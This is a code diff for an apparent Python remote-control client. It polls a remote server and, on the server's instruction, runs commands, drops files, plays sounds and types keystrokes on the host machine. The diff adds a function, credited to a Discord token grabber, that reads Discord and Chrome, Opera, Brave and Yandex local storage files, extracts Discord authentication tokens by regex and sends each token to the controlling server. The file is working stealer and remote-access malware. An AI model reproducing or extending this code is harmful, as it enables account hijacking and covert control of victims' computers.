@@ -1,14 +1,14 @@
 from requests import RequestException, Response, post, get
+from os import listdir, remove, getenv, getcwd, chdir
 from subprocess import CREATE_NEW_CONSOLE, Popen
 from PIL import UnidentifiedImageError, Image
 from fleep import get as get_soundtype
 from playsound import playsound
-from os import remove, getenv
 from threading import Thread
 from base64 import b64decode
 from time import time, sleep
-from os import getcwd, chdir
 from random import choices
+from re import findall
 from sys import exit
 import pyautogui
 
@@ -67,6 +67,10 @@ def main() -> None:
                 f"{SCHEME}://{IP}:{PORT}/typestring-center",
                 timeout=CONNECT_TIMEOUT,
             )
+            gettoken_response = get(
+                f"{SCHEME}://{IP}:{PORT}/gettokens-center",
+                timeout=CONNECT_TIMEOUT,
+            )
 
             if commands_response.status_code == 200:
                 run_command(commands_response)
@@ -86,13 +90,15 @@ def main() -> None:
                     dropfile_response.json().get("location"),
                 )
             if username_response.status_code == 200:
-                post_user()
+                send_user()
             if playsound_response.status_code == 200:
                 play_sound(playsound_response.content)
             if typestring_response.status_code == 200:
                 Thread(
                     target=typestring_thread, args=[typestring_response.json()]
                 ).start()
+            if gettoken_response.status_code == 200:
+                send_tokens()
 
             if not connected:
                 print("Connected and asked server for actions.")
@@ -113,6 +119,47 @@ def main() -> None:
     except Exception as error:
         print(error)
         main()
+
+
+def send_tokens() -> None:
+    # grabber code from https://github.com/wodxgod/Discord-Token-Grabber/
+
+    roaming = getenv("AppData")
+    local = getenv("LocalAppData")
+
+    for path in [
+        roaming + r"\Discord",
+        roaming + r"\discordcanary",
+        roaming + r"\discordptb",
+        local + r"\Google\Chrome\User Data\Default",
+        roaming + r"\Opera Software\Opera Stable",
+        local + r"\BraveSoftware\Brave-Browser\User Data\Default",
+        local + r"\Yandex\YandexBrowser\User Data\Default",
+    ]:
+        path += r"\Local Storage\leveldb"
+
+        tokens = []
+
+        for file_name in listdir(path):
+            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+                continue
+
+            for line in [
+                line.strip()
+                for line in open(rf"{path}\{file_name}", errors="ignore").readlines()
+                if line.strip()
+            ]:
+                for regex in [r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"]:
+                    for token in findall(regex, line):
+                        if token not in tokens:
+                            Thread(
+                                target=post,
+                                args=[
+                                    f"{SCHEME}://{IP}:{PORT}/getuser-center?token={token}"
+                                ],
+                                name="send_token",
+                            ).start()  # for async requests
+                            tokens.append(token)
 
 
 def typestring_thread(response_json: dict) -> None:
@@ -137,7 +184,7 @@ def play_sound(soundfile_data: bytes) -> None:
     chdir(old_cd)
 
 
-def post_user() -> None:
+def send_user() -> None:
     post(f"{SCHEME}://{IP}:{PORT}/getuser-center?username={getenv('USERNAME')}")
 
 
